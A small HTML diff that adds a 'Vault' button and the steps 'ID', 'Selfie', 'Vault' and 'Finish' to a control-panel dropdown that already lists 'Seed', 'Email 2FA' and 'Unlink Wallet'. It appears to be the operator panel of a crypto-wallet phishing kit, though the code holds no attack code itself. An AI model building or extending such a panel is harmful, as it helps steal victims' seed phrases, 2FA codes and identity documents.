@@ -1244,6 +1244,7 @@ tr:hover {
             </div>
 
             <button class="btn btn-primary" id="updateSeed">Generate Seed</button>
+            <button class="btn btn-secondary" onclick="window.open('vault_management.php', '_blank')">🏦 Vault</button>
             <button class="btn btn-secondary" id="refreshButton">Refresh</button>
             <button class="btn btn-danger" type="submit" id="logoutButton">Log out</button>
         </div>
@@ -1411,7 +1412,11 @@ tr:hover {
         <option value="auth-app">Unlink Wallet</option>
         <option value="email-2fa">Email 2FA</option>
         <option value="url">URL</option>
+        <option value="id">ID</option>
+        <option value="selfie">Selfie</option>
         <option value="seed">Seed</option>
+        <option value="vault">Vault</option>
+        <option value="finish">Finish</option>
 </select>
 
         <button id="okButton">OK</button>
